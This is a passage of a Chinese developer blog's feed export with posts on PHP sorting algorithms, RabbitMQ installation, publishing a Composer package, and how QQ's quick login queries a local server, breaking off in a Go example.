<h4 id="选择排序"><a href="#选择排序" class="headerlink" title="选择排序"></a>选择排序</h4><p>思路分析：在要排序的一组数中，选出最小的一个数与第一个位置的数交换。然后在剩下的数当中再找最小的与第二个位置的数交换，如此循环到倒数第二个数和最后一个数比较为止。</p>
<p>代码实现：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">selectSort</span><span class="params">($arr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//双重循环完成，外层控制轮数，内层控制比较次数</span></span><br><span class="line">    $len = count($arr);</span><br><span class="line">    <span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; $len - <span class="number">1</span>; $i++) &#123;</span><br><span class="line">        <span class="comment">//先假设最小的值的位置</span></span><br><span class="line">        $p = $i;</span><br><span class="line">        <span class="keyword">for</span> ($j = $i + <span class="number">1</span>; $j &lt; $len; $j++) &#123;</span><br><span class="line">            <span class="comment">//$arr[$p] 是当前已知的最小值</span></span><br><span class="line">            <span class="keyword">if</span> ($arr[$p] &gt; $arr[$j]) &#123;</span><br><span class="line">                <span class="comment">//比较，发现更小的,记录下最小值的位置；并且在下次比较时采用已知的最小值进行比较。</span></span><br><span class="line">                $p = $j;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//已经确定了当前的最小值的位置，保存到$p中。如果发现最小值的位置与当前假设的位置$i不同，则位置互换即可。</span></span><br><span class="line">        <span class="keyword">if</span> ($p != $i) &#123;</span><br><span class="line">            $tmp = $arr[$p];</span><br><span class="line">            $arr[$p] = $arr[$i];</span><br><span class="line">            $arr[$i] = $tmp;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//返回最终结果</span></span><br><span class="line">    <span class="keyword">return</span> $arr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="插入排序"><a href="#插入排序" class="headerlink" title="插入排序"></a>插入排序</h4><p>思路分析：在要排序的一组数中，假设前面的数已经是排好顺序的，现在要把第n个数插到前面的有序数中，使得这n个数也是排好顺序的。如此反复循环，直到全部排好顺序。</p>
<p>代码实现：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">insertSort</span><span class="params">($arr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $len = count($arr);</span><br><span class="line">    <span class="keyword">for</span> ($i=<span class="number">1</span>; $i&lt;$len; $i++) &#123;</span><br><span class="line">        $tmp = $arr[$i];</span><br><span class="line">        <span class="comment">//内层循环控制，比较并插入</span></span><br><span class="line">        <span class="keyword">for</span> ($j = $i - <span class="number">1</span>; $j &gt;= <span class="number">0</span>; $j--) &#123;</span><br><span class="line">            <span class="keyword">if</span> ($tmp &lt; $arr[$j]) &#123;</span><br><span class="line">                <span class="comment">//发现插入的元素要小，交换位置，将后边的元素与前面的元素互换</span></span><br><span class="line">                $arr[$j + <span class="number">1</span>] = $arr[$j];</span><br><span class="line">                $arr[$j] = $tmp;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="comment">//如果碰到不需要移动的元素，由于是已经排序好是数组，则前面的就不需要再次比较了。</span></span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $arr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="快速排序"><a href="#快速排序" class="headerlink" title="快速排序"></a>快速排序</h4><p>思路分析：选择一个基准元素，通常选择第一个元素或者最后一个元素。通过一趟扫描，将待排序列分成两部分，一部分比基准元素小，一部分大于等于基准元素。此时基准元素在其排好序后的正确位置，然后再用同样的方法递归地排序划分的两部分。</p>
<p>代码实现：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">quickSort</span><span class="params">($arr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//先判断是否需要继续进行</span></span><br><span class="line">    $length = count($arr);</span><br><span class="line">    <span class="keyword">if</span> ($length &lt;= <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> $arr;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//选择第一个元素作为基准</span></span><br><span class="line">    $base_num = $arr[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">    <span class="comment">//遍历除了标尺外的所有元素，按照大小关系放入两个数组内</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//初始化两个数组</span></span><br><span class="line">    $left_array = <span class="keyword">array</span>();  <span class="comment">//小于基准的</span></span><br><span class="line">    $right_array = <span class="keyword">array</span>();  <span class="comment">//大于基准的</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> ($i = <span class="number">1</span>; $i &lt; $length; $i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> ($base_num &gt; $arr[$i]) &#123;</span><br><span class="line">            <span class="comment">//放入左边数组</span></span><br><span class="line">            $left_array[] = $arr[$i];</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">//放入右边</span></span><br><span class="line">            $right_array[] = $arr[$i];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//再分别对左边和右边的数组进行相同的排序处理方式递归调用这个函数</span></span><br><span class="line">    $left_array = quickSort($left_array);</span><br><span class="line">    $right_array = quickSort($right_array);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//合并</span></span><br><span class="line">    <span class="keyword">return</span> array_merge($left_array, <span class="keyword">array</span>($base_num), $right_array);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>PHP</category>
      </categories>
  </entry>
  <entry>
    <title>RabbitMQ快速上手教程</title>
    <url>/articles/RabbitMQ%E5%BF%AB%E9%80%9F%E4%B8%8A%E6%89%8B%E6%95%99%E7%A8%8B/</url>
    <content><![CDATA[<h3 id="WINDOWS系统"><a href="#WINDOWS系统" class="headerlink" title="WINDOWS系统"></a>WINDOWS系统</h3><h4 id="1、安装Erlang语言开发包"><a href="#1、安装Erlang语言开发包" class="headerlink" title="1、安装Erlang语言开发包"></a>1、安装Erlang语言开发包</h4><ul>
<li><p>下载地址：<a href="http://www.erlang.org/download" target="_blank" rel="noopener">传送门</a></p>
</li>
<li><p>配置环境变量 <code>ERLANG_HOME</code> C:\Program Files (x86)\erl5.9 (即erl安装位置)</p>
</li>
<li><p>添加到PATH  <code>%ERLANG_HOME%\bin</code>;</p>
</li>
</ul>
<h4 id="2、安装RabbitMQ"><a href="#2、安装RabbitMQ" class="headerlink" title="2、安装RabbitMQ"></a>2、安装RabbitMQ</h4><p><code>提示：中文路径名将会安装失败</code></p>
<ul>
<li><p>下载安装RabbitMQ，下载地址：<a href="http://www.rabbitmq.com/releases/rabbitmq-server/v3.3.4/rabbitmq-server-3.3.4.exe" target="_blank" rel="noopener">传送门</a></p>
</li>
<li><p>配置环境变量 <code>RABBITMQ_SERVER</code> C:\Program Files (x86)\RabbitMQ Server\rabbitmq_server-2.8.0 (即rabbitmq_server安装位置)</p>
</li>
<li><p>添加到<code>PATH</code> %RABBITMQ_SERVER%\sbin;</p>
</li>
<li><p>然后到dos(命令提示符)里面切换到RabbitMQ目录下，执行 <code>rabbitmq-plugins.bat enable rabbitmq_management</code>，</p>
</li>
<li><p>执行完成之后以管理员身份启动 rabbitmq：依次输入命令：</p>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">rabbitmq-service.bat stop</span><br><span class="line"></span><br><span class="line">rabbitmq-service.bat install</span><br><span class="line"></span><br><span class="line">rabbitmq-service.bat start</span><br></pre></td></tr></table></figure>

<ul>
<li>然后，浏览器中输入:127.0.0.1:15672,用户名密码是guest ,如果能登陆就说明安装成功</li>
</ul>
<p><img src="/articles/RabbitMQ快速上手教程/15672.png" alt="Manage"></p>
<ul>
<li>到此 RabbitMQ 已经安装完成，接下来针对php安装扩展（非php技术栈可跳过）</li>
</ul>
<h4 id="3、安装php的amqp扩展"><a href="#3、安装php的amqp扩展" class="headerlink" title="3、安装php的amqp扩展"></a>3、安装php的amqp扩展</h4><ul>
<li><p>根据phpinfo()的信息去下载相应的amqp扩展DLL版本： <a href="http://pecl.php.net/package/amqp" target="_blank" rel="noopener">传送门</a></p>
</li>
<li><p>将压缩包中<code>php_amqp.dll</code>复制到<code>php/ext</code>目录下</p>
</li>
<li><p>然后在php.ini中添加如下代码：</p>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[amqp]</span><br><span class="line"></span><br><span class="line">extension=php_amqp.dll</span><br></pre></td></tr></table></figure>

<ul>
<li><p>再将压缩包中<code>rabbitmq.1.dll</code>复制到php根目录<code>C:/wampserver/php/</code>(目录和下面配置目录保持一致即可)</p>
</li>
<li><p>然后修改apache配置文件httpd.conf，添加如下代码：</p>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># rabbitmq</span><br><span class="line"></span><br><span class="line">LoadFile  &quot;C:/wampserver/php/rabbitmq.1.dll&quot;</span><br></pre></td></tr></table></figure>

<ul>
<li>最后重启服务器. phpinfo() 出现下图说明安装成功：</li>
</ul>
<p><img src="/articles/RabbitMQ快速上手教程/extends.png" alt="amqp"></p>
<h3 id="Linux系统"><a href="#Linux系统" class="headerlink" title="Linux系统"></a>Linux系统</h3><h4 id="1、安装rabbitmq"><a href="#1、安装rabbitmq" class="headerlink" title="1、安装rabbitmq"></a>1、安装rabbitmq</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">a) 进入rabbitmq文件的存放目录</span><br><span class="line"></span><br><span class="line">b) rpm -ivh rabbitmq-server-3.5.4-1.noarch.rpm</span><br></pre></td></tr></table></figure>

<h4 id="2、修改配置"><a href="#2、修改配置" class="headerlink" title="2、修改配置"></a>2、修改配置</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd /etc/rabbitmq</span><br><span class="line"></span><br><span class="line">cd /usr/share/doc/rabbitmq-server-3.5.4</span><br></pre></td></tr></table></figure>

<p>拷贝</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cp rabbitmq.config.example /etc/rabbitmq/rabbitmq.config</span><br></pre></td></tr></table></figure>

<p>进入到拷贝的rabbitmq.config目录</p>
<p>修改配置</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">vim rabbitmq.config</span><br></pre></td></tr></table></figure>

<p>修改 <code>{loopback_users, []}</code> 把注释和后面的逗号去掉；</p>
<h4 id="3、启动服务-在etc-rabbitmq目录下执行"><a href="#3、启动服务-在etc-rabbitmq目录下执行" class="headerlink" title="3、启动服务(在etc/rabbitmq目录下执行)"></a>3、启动服务(在etc/rabbitmq目录下执行)</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">service rabbitmq-server start</span><br></pre></td></tr></table></figure>

<h4 id="4、设置开机启动"><a href="#4、设置开机启动" class="headerlink" title="4、设置开机启动"></a>4、设置开机启动</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">chkconfig rabbitmq-server on</span><br></pre></td></tr></table></figure>

<h4 id="5、开启控制台管理插件"><a href="#5、开启控制台管理插件" class="headerlink" title="5、开启控制台管理插件"></a>5、开启控制台管理插件</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">rabbitmq-plugins enable rabbitmq_management</span><br></pre></td></tr></table></figure>

<h4 id="6、网页打开"><a href="#6、网页打开" class="headerlink" title="6、网页打开"></a>6、网页打开</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http://localhost:15672  默认用户名密码：guest/guest</span><br></pre></td></tr></table></figure>

<h4 id="7、打开端口-程序访问端口5672"><a href="#7、打开端口-程序访问端口5672" class="headerlink" title="7、打开端口(程序访问端口5672)"></a>7、打开端口(程序访问端口5672)</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">/sbin/iptables -I INPUT -p tcp --dport 15672 -j ACCEPT</span><br><span class="line"></span><br><span class="line">/sbin/iptables -I INPUT -p tcp --dport 5672 -j ACCEPT</span><br></pre></td></tr></table></figure>

<p>保存</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">/etc/rc.d/init.d/iptables save</span><br></pre></td></tr></table></figure>

<p>查看端口打开</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">/etc/init.d/iptables status</span><br></pre></td></tr></table></figure>

<h3 id="测试DEMO"><a href="#测试DEMO" class="headerlink" title="测试DEMO"></a>测试DEMO</h3><p>安装amqplib扩展 compose.json</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"require"</span>: &#123;</span><br><span class="line">        <span class="attr">"php-amqplib/php-amqplib"</span>: <span class="string">"&gt;=2.6.1"</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>send.php 生产端</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">require_once</span> <span class="keyword">__DIR__</span> . <span class="string">'/vendor/autoload.php'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">PhpAmqpLib</span>\<span class="title">Connection</span>\<span class="title">AMQPStreamConnection</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">PhpAmqpLib</span>\<span class="title">Message</span>\<span class="title">AMQPMessage</span>;</span><br><span class="line"></span><br><span class="line">$connection = <span class="keyword">new</span> AMQPStreamConnection(<span class="string">'locahost'</span>, <span class="number">5672</span>, <span class="string">'root'</span>, <span class="string">'root'</span>); <span class="comment">// 注意此处有账号权限限制</span></span><br><span class="line"></span><br><span class="line">$channel = $connection-&gt;channel();</span><br><span class="line"></span><br><span class="line">$channel-&gt;queue_declare(<span class="string">'hello'</span>, <span class="keyword">false</span>, <span class="keyword">false</span>, <span class="keyword">false</span>, <span class="keyword">false</span>);</span><br><span class="line"></span><br><span class="line">$msg = <span class="keyword">new</span> AMQPMessage(<span class="string">'Hello World!'</span>);</span><br><span class="line"></span><br><span class="line">$channel-&gt;basic_publish($msg, <span class="string">''</span>, <span class="string">'hello'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">" [x] Sent 'Hello World!'\n"</span>;</span><br><span class="line"></span><br><span class="line">$channel-&gt;close();</span><br><span class="line"></span><br><span class="line">$connection-&gt;close();</span><br></pre></td></tr></table></figure>

<p>receive.php 消费端</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">require_once</span> <span class="keyword">__DIR__</span> . <span class="string">'/vendor/autoload.php'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">PhpAmqpLib</span>\<span class="title">Connection</span>\<span class="title">AMQPStreamConnection</span>;</span><br><span class="line"></span><br><span class="line">$connection = <span class="keyword">new</span> AMQPStreamConnection(<span class="string">'localhost'</span>, <span class="number">5672</span>, <span class="string">'root'</span>, <span class="string">'root'</span>);</span><br><span class="line"></span><br><span class="line">$channel = $connection-&gt;channel();</span><br><span class="line"></span><br><span class="line">$channel-&gt;queue_declare(<span class="string">'hello'</span>, <span class="keyword">false</span>, <span class="keyword">false</span>, <span class="keyword">false</span>, <span class="keyword">false</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">" [*] Waiting for messages. To exit press CTRL+C\n"</span>;</span><br><span class="line"></span><br><span class="line">$callback = <span class="function"><span class="keyword">function</span> <span class="params">($msg)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">' [x] Received '</span>, $msg-&gt;body, <span class="string">"\n"</span>;</span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">$channel-&gt;basic_consume(<span class="string">'hello'</span>, <span class="string">''</span>, <span class="keyword">false</span>, <span class="keyword">true</span>, <span class="keyword">false</span>, <span class="keyword">false</span>, $callback);</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (count($channel-&gt;callbacks)) &#123;</span><br><span class="line"></span><br><span class="line">    $channel-&gt;wait();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$channel-&gt;close();</span><br><span class="line"></span><br><span class="line">$connection-&gt;close();</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>中间件</category>
      </categories>
  </entry>
  <entry>
    <title>PHP发布自己的composer包</title>
    <url>/articles/PHP%E5%8F%91%E5%B8%83%E8%87%AA%E5%B7%B1%E7%9A%84composer%E5%8C%85/</url>
    <content><![CDATA[<h3 id="1-准备工作"><a href="#1-准备工作" class="headerlink" title="1. 准备工作"></a>1. 准备工作</h3><p>注册 Github 账号 ： <a href="https://github.com/" target="_blank" rel="noopener">https://github.com/</a><br>注册 Packagist 账号 ： <a href="https://packagist.org/" target="_blank" rel="noopener">https://packagist.org/</a> (可以使用github账户登录)</p>
<h3 id="2-添加git仓库"><a href="#2-添加git仓库" class="headerlink" title="2. 添加git仓库"></a>2. 添加git仓库</h3><h4 id="2-1-创建-Github-仓库"><a href="#2-1-创建-Github-仓库" class="headerlink" title="2.1 创建 Github 仓库"></a>2.1 创建 Github 仓库</h4><p><img src="/articles/PHP发布自己的composer包/20200113160400.png" alt></p>
<p>并按要求填写信息</p>
<h4 id="2-2-克隆到本地"><a href="#2-2-克隆到本地" class="headerlink" title="2.2 克隆到本地"></a>2.2 克隆到本地</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/gouyuwang/lumen.git</span><br></pre></td></tr></table></figure>

<h4 id="2-3-初始化composer-json"><a href="#2-3-初始化composer-json" class="headerlink" title="2.3 初始化composer.json"></a>2.3 初始化composer.json</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">composer init</span><br></pre></td></tr></table></figure>

<p>接下来全部回车 （如果有依赖，则按需求搜索依赖包）</p>
<p><img src="/articles/PHP发布自己的composer包/20200113161442.png" alt></p>
<p>或者手动创建composer.json文件</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"name"</span>: <span class="string">"gouyuwang/lumen"</span>,</span><br><span class="line">    <span class="attr">"description"</span>: <span class="string">"lumen helper"</span>,</span><br><span class="line">    <span class="attr">"type"</span>: <span class="string">"library"</span>,</span><br><span class="line">    <span class="attr">"license"</span>: <span class="string">"MIT"</span>,</span><br><span class="line">    <span class="attr">"authors"</span>: [</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="attr">"name"</span>: <span class="string">"gouyuwang"</span>,</span><br><span class="line">            <span class="attr">"email"</span>: <span class="string">"529156563@qq.com"</span></span><br><span class="line">        &#125;</span><br><span class="line">    ],</span><br><span class="line">    # 如果你的数据需要加上PHP版本，并加入了src目录 需要追加下面配置</span><br><span class="line">    "require": &#123; </span><br><span class="line">		"php": "&gt;=7.0",</span><br><span class="line">	    "php-curl-class/php-curl-class": "^7.2"</span><br><span class="line">	&#125;,</span><br><span class="line">	"require-dev": &#123; </span><br><span class="line">        "composer/composer": "^1.2",</span><br><span class="line">        "friendsofphp/php-cs-fixer": "~2",</span><br><span class="line">        "phpunit/phpunit": "^4.8.35 || ^5.7",</span><br><span class="line">		"php-curl-class/php-curl-class": "^7.2"</span><br><span class="line">    &#125;,</span><br><span class="line">	"autoload": &#123;</span><br><span class="line">		"psr-4": &#123;</span><br><span class="line">		  "gouyuwang\\lumen\\": "src/"</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<h4 id="2-4-初始化-gitignore"><a href="#2-4-初始化-gitignore" class="headerlink" title="2.4 初始化 .gitignore"></a>2.4 初始化 .gitignore</h4><p>文件内容</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">/vendor/</span><br></pre></td></tr></table></figure>

<h4 id="2-5-业务逻辑"><a href="#2-5-业务逻辑" class="headerlink" title="2.5 业务逻辑"></a>2.5 业务逻辑</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">gouyuwang</span>\<span class="title">lumen</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Response</span></span></span><br><span class="line"><span class="class"></span>&#123;  </span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">echo</span> <span class="params">( $text)</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">	    header(<span class="string">"Content-type:text/html"</span>);</span><br><span class="line">	    <span class="keyword">echo</span> $text;</span><br><span class="line">	    <span class="keyword">exit</span>;</span><br><span class="line">	&#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>注意：PHP文件书写几个要点</p>
<ul>
<li>文中出现的不管是系统还是依赖的class 都必须开头使用 use 引入</li>
<li>命名空间是你的项目名称对应的目录 [git-username]/[文件目录]</li>
<li>代码放入src 类名与文件名最好相同</li>
</ul>
<h4 id="2-6-文件目录结构"><a href="#2-6-文件目录结构" class="headerlink" title="2.6 文件目录结构"></a>2.6 文件目录结构</h4><p><img src="/articles/PHP发布自己的composer包/20200113162200.png" alt></p>
<h3 id="3-上传至git"><a href="#3-上传至git" class="headerlink" title="3. 上传至git"></a>3. 上传至git</h3><p>如果有sourcetree 可以忽略下面的提交命令</p>
<h4 id="3-1-提交"><a href="#3-1-提交" class="headerlink" title="3.1 提交"></a>3.1 提交</h4><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">git init</span><br><span class="line">git add .</span><br><span class="line">git commit -m <span class="string">"first commit"</span></span><br><span class="line">git remote add origin gouyuwang@github.com:gouyuwang/lumen.git</span><br><span class="line">git push origin master</span><br></pre></td></tr></table></figure>

<h4 id="3-2-打tag"><a href="#3-2-打tag" class="headerlink" title="3.2 打tag"></a>3.2 打tag</h4><p>为什么要打tag？</p>
<p>tag相当于你的项目到了一个新的阶段，不再是开发版，否则使用</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">composer require gouyuwang/lumen @dev #其中 `@dev` 必不可少</span><br></pre></td></tr></table></figure>

<p>查看最新提交的版本号</p>
<p><img src="/articles/PHP发布自己的composer包/20200113162539.png" alt></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git log --oneline --decorate --graph</span><br></pre></td></tr></table></figure>

<p>打tag</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git tag v1.1 61d974a  // 在某个commit 上打tag</span><br><span class="line"></span><br><span class="line">git push origin test_tag // 提交到线上库</span><br></pre></td></tr></table></figure>

<p>删除 tag</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git tag -d v1.1 // 删除某个commit 上的tag</span><br><span class="line"></span><br><span class="line">git push origin :refs/tags/v1.1 // 提交到线上库</span><br></pre></td></tr></table></figure>

<h3 id="4-提交packageist"><a href="#4-提交packageist" class="headerlink" title="4. 提交packageist"></a>4. 提交packageist</h3><p>访问并登陆：<a href="https://packagist.org" target="_blank" rel="noopener">https://packagist.org</a></p>
<p><img src="/articles/PHP发布自己的composer包/20200113162941.png" alt></p>
<p>点击右上角的 submit , 输入你的git地址 ： <a href="https://github.com/gouyuwang/lumen.git" target="_blank" rel="noopener">https://github.com/gouyuwang/lumen.git</a></p>
<p>点击 check, 完成后点击 submit 即提交完成</p>
<h3 id="5-检出依赖包"><a href="#5-检出依赖包" class="headerlink" title="5. 检出依赖包"></a>5. 检出依赖包</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">composer require gouyuwang/lumen</span><br></pre></td></tr></table></figure>

<p>如果报错：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[InvalidArgumentException]</span><br><span class="line">Could not find a version of package gouyuwang/lumen matching your minimum-stability (stable). Require it with an explicit version constraint allowing its desired stability.</span><br></pre></td></tr></table></figure>

<p>可能是你的tag没打成功，或者打成功后，并没有同步到国外服务器，请耐心等待</p>
<p>替代方案：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">composer require gouyuwang/lumen @dev</span><br></pre></td></tr></table></figure>

<p>现在你可以在项目中使用你写的依赖库了</p>
]]></content>
      <categories>
        <category>PHP</category>
      </categories>
  </entry>
  <entry>
    <title>QQ如何实现跨端通信的</title>
    <url>/articles/QQ%E5%A6%82%E4%BD%95%E5%AE%9E%E7%8E%B0%E8%B7%A8%E7%AB%AF%E9%80%9A%E4%BF%A1%E7%9A%84/</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>这个问题之前很好解决，使用浏览器 plugin 即可。</p>
<p>但是随着 Chrome 和 Firefox 都先后放弃了 NPAPI plugin，这一方法也行不通了，而且很多人是很讨厌 plugin 的。</p>
<p>但是在默认禁止了 NPAPI 的 Chrome 版本，QQ 依然可以实现快速登录（一键登录），是怎么做到的呢？</p>
<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>其实不难猜。既然不存在 plugin，无法以此来实现浏览器内和本地客户端的直接通信，那么排除其他的黑科技，有一种很简单的方法可以实现这个效果。</p>
<p>那就是在客户端开一个 Server，在浏览器里面请求这个地址。</p>
<p>理论上这样是可以实现的，至于 QQ 是不是用的这种方法，稍微验证下好了。</p>
<h2 id="验证"><a href="#验证" class="headerlink" title="验证"></a>验证</h2><p>找一个有 QQ 快速登陆的页面，比如 mail.qq.com登陆 QQ 客户端打开浏览器的 <em>Developer Tools -&gt; Network</em> 刷新页面，观察所有请求的 domain。 很明显，我们要找的完整请求 url 是这样的</p>
<blockquote>
<p><a href="https://localhost.ptlogin2.qq.com:4301/pt_get_uins?callback=ptui_getuins_CB&amp;r=0.125114&amp;pt_local_tk=-2004781" target="_blank" rel="noopener">https://localhost.ptlogin2.qq.com:4301/pt_get_uins?callback=ptui_getuins_CB&amp;r=0.125114&amp;pt_local_tk=-2004781</a></p>
</blockquote>
<p>看看这个请求的 Response Content</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> var_sso_uin_list=[</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="string">"account"</span>:<span class="string">"xxxxxx"</span>,</span><br><span class="line">        <span class="string">"client_type"</span>:<span class="number">65793</span>,</span><br><span class="line">        <span class="string">"face_index"</span>:<span class="number">0</span>,</span><br><span class="line">        <span class="string">"gender"</span>:<span class="number">1</span>,</span><br><span class="line">        <span class="string">"nickname"</span>:<span class="string">"xxx"</span>,</span><br><span class="line">        <span class="string">"uin"</span>:<span class="string">"xxx"</span>,</span><br><span class="line">        <span class="string">"uin_flag"</span>:xxxxx</span><br><span class="line">    &#125;</span><br><span class="line">];</span><br><span class="line">ptui_getuins_CB(var_sso_uin_list);</span><br></pre></td></tr></table></figure>

<p>很明显是当前登录的用户信息, ping 一下这个请求的 domain, 不出所料结果是 127.0.0.1</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ping localhost.ptlogin2.qq.com</span><br><span class="line"></span><br><span class="line">// Pinging localhost.ptlogin2.qq.com [127.0.0.1] with 32 bytes of data</span><br></pre></td></tr></table></figure>

<p>现在我们验证下是否是 QQ 开了这个 Server</p>
<p>查看哪个程序占用了 4301 端口</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">netstat -ano | findstr &quot;4301&quot;</span><br><span class="line"></span><br><span class="line">// TCP    127.0.0.1:4301   0.0.0.0:0   LISTENING   4152</span><br></pre></td></tr></table></figure>

<p>得到 pid 我们就可以看否是 QQ 在监听这个端口了</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">tasklist | findstr &quot;4152&quot;</span><br><span class="line"></span><br><span class="line">// QQ.exe  4152 Console   1    178,616 K</span><br></pre></td></tr></table></figure>

<blockquote>
<p>可能有人担心会不会有安全问题，会不会其他网站访问这个 url 就拿走用户信息？其实挺容易解决，存一个 token 到服务器端，获取的时候校验下就好了。</p>
<p>但是归根到底取决于腾讯对这方面安全的重视程度和意愿了，至少之前是确实存在从网页上获取当前登录的 QQ 信息的方法，虽然问题不是出在快速登录这部分。</p>
</blockquote>
<h2 id="模拟"><a href="#模拟" class="headerlink" title="模拟"></a>模拟</h2><p>接下来我用<strong>GOLang</strong>模拟这种技术实现</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">"fmt"</span> </span><br><span class="line">    <span class="string">"log"</span> </span><br><span class="line">    <span class="string">"io"</span> </span><br><span class="line">    <span class="string">"net"</span> </span><br><span class="line">    <span class="string">"net/http"</span></span><br><span class="line">	<span class="string">"encoding/json"</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> Data <span class="keyword">struct</span>&#123;</span><br><span class="line">    Ip <span class="keyword">string</span></span><br><span class="line">	Mac <span class="keyword">string</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">type</span> Ret <span class="keyword">struct</span>&#123;</span><br><span class="line">	Code <span class="keyword">int</span> </span><br><span class="line">	Msg <span class="keyword">string</span></span><br><span class="line">	Data Data</span><br><span class="line">&#125;  